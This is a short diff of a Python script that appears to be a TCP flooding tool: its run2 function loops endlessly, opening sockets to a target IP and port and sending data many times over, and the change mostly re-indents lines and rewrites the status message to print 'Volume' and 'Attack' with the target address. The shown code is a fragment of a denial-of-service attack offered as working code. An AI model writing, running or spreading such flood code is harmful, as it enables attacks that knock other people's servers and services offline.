@@ -86,11 +86,11 @@ def run2():
 	while true:
 		try:
 		        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		        s.connect((ip,port))
-		        s.send(data)
-		        for x in range(times):
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
 				s.send(data)
-                        print(i + "\033[32mRequest Attack tcp \033[0m")
+			print(i + "\033[33mVolume " +str(u)+ " \033[94mAttack " +ip+ "\033[0m")
 		except:
 		        s.close()
 		        print("[-] \033[31mError!!!\033[0m")
